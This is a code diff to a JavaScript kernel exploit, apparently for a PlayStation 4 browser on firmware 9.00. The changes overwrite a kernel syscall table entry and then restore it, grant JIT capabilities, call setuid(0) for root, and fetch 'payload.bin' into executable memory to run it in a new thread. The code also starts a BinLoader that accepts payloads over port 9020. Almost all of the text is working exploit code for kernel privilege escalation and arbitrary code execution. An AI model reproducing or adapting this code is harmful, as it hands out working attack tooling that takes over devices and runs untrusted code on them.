@@ -1505,6 +1505,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // sysent[661] is unimplemented so free for use
     const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
+    const sy_narg = kmem.read32(sysent_661);
+    const sy_call = kmem.read64(sysent_661.add(8));
+    const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1515,9 +1518,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('add JIT capabilities');
     // TODO just set the bits for JIT privs
     // cr_sceCaps[0]
-     kmem.write64(p_ucred.add(0x60), -1);
+    kmem.write64(p_ucred.add(0x60), -1);
     // cr_sceCaps[1]
-     kmem.write64(p_ucred.add(0x68), -1);
+    kmem.write64(p_ucred.add(0x68), -1);
 
     const buf = await get_patches('./kpatch/900.elf');
     // FIXME handle .bss segment properly
@@ -1594,9 +1597,13 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-    localStorage.ExploitLoaded="yes"
-    sessionStorage.ExploitLoaded="yes"
-    //alert("kernel exploit succeeded!");
+    log('restore sys_aio_submit()');
+    kmem.write32(sysent_661, sy_narg);
+    // .sy_call = gadgets['jmp qword ptr [rsi]']
+    kmem.write64(sysent_661.add(8), sy_call);
+    // .sy_thrcnt = SY_THR_STATIC
+    kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
+    alert("kernel exploit succeeded!");
 }
 
 
@@ -1618,20 +1625,6 @@ function setup(block_fd) {
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
-    {
-        const reqs1 = make_reqs1(1);
-        const timo = new Word(1);
-        const id = new Word();
-        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
-        chain.do_syscall_clear_errno(
-            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
-        const err = chain.errno;
-        if (err !== 60) { // ETIMEDOUT
-            die(`SceAIO system not blocked. errno: ${err}`);
-        }
-        free_aios(id.addr, 1);
-    }
-
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
     const num_reqs = 3;
@@ -1643,22 +1636,6 @@ function setup(block_fd) {
     cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
 }
-
-function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    function malloc32(sz) {
-        var backing = new Uint8Array(0x10000 + sz * 4);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = new Uint32Array(backing.buffer);
-        return ptr;
-    }
 
 function runBinLoader() {
     var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
@@ -1699,7 +1676,7 @@ function runBinLoader() {
         payload_buffer
     );
 
-    log('GoldHEN Already Loaded, BinLoader Is Ready. Send A Payload To Port 9020 Now');
+    log('BinLoader is ready. Send a payload to port 9020 now');
 }
 
 // overview:
@@ -1718,16 +1695,20 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
+    if(sessionStorage.getItem('binloader')){
+        runBinLoader();
+        return new Promise(() => {});
+    }
+
+    // If setuid is successful, we dont need to run the kexploit again
     try {
-       chain.sys('setuid', 0);
-    } catch (e) {
-        localStorage.ExploitLoaded = "no";
-    }
-    
-    if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
+        if (sysi('setuid', 0) == 0) {
+            log("Not running kexploit again.");
             runBinLoader();
-            return new Promise(() => {});
+            return;
+        }
     }
+    catch (e) {}
 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
@@ -1803,19 +1784,28 @@ export async function kexploit() {
         close(sd);
     }
 }
-function array_from_address(addr, size) {
-var og_array = new Uint32Array(0x1000);
-var og_array_i = mem.addrof(og_array).add(0x10);
-mem.write64(og_array_i, addr);
-mem.write32(og_array_i.add(0x8), size);
-mem.write32(og_array_i.add(0xC), 0x1);
-nogc.push(og_array);
-return og_array;
+
+
+function malloc(sz) {
+    var backing = new Uint8Array(0x10000 + sz);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = backing;
+    return ptr;
 }
 
+function malloc32(sz) {
+    var backing = new Uint8Array(0x10000 + sz * 4);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = new Uint32Array(backing.buffer);
+    return ptr;
+}
+
+
 kexploit().then(() => {
-    
-const PROT_READ = 1;
+
+ const PROT_READ = 1;
  const PROT_WRITE = 2;
  const PROT_EXEC = 4;
 
@@ -1830,48 +1820,16 @@ var loader_addr = chain.sysp(
 );
 
  var tmpStubArray = array_from_address(loader_addr, 1);
-tmpStubArray[0] = 0x00C3E7FF;
+ tmpStubArray[0] = 0x00C3E7FF;
 
- /*var req = new XMLHttpRequest();
- req.responseType = "arraybuffer";
- req.open('GET','payload.bin');
- req.send();
- req.onreadystatechange = function () {
-  if (req.readyState == 4) {
- var PLD = req.response;
-  var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-  var byteLen = PLD.byteLength;   
-  var padLen  = (4 - (byteLen % 4)) % 4; 
-  var tmp = new Uint8Array(byteLen + padLen);
- tmp.set(new Uint8Array(PLD), 0);
-       if (padLen > 0) {
-           var zeros = new Uint8Array(padLen);
-         tmp.set(zeros, byteLen);
-       }
-      var shellcode = new Uint32Array(tmp.buffer);
-       var pl = array_from_address(payload_buffer, shellcode.length);
-      
-      pl.set(shellcode, 0);
-      var pthread = malloc(0x10); 
-      call_nze(
-      'pthread_create',
-      pthread,          
-      0,                
-      loader_addr,      
-      payload_buffer    
-    );
-
-}
- };
-    */
-var req = new XMLHttpRequest();
+ var req = new XMLHttpRequest();
  req.responseType = "arraybuffer";
  req.open('GET','payload.bin');
  req.send();
  req.onreadystatechange = function () {
   if (req.readyState == 4) {
    var PLD = req.response;
-  var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
+   var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
    var pl = array_from_address(payload_buffer, PLD.byteLength*4);
    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
    var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
@@ -1888,7 +1846,7 @@ var req = new XMLHttpRequest();
         loader_addr,
         payload_buffer,
     );	
-}
+   }
  };
-    
+
 })
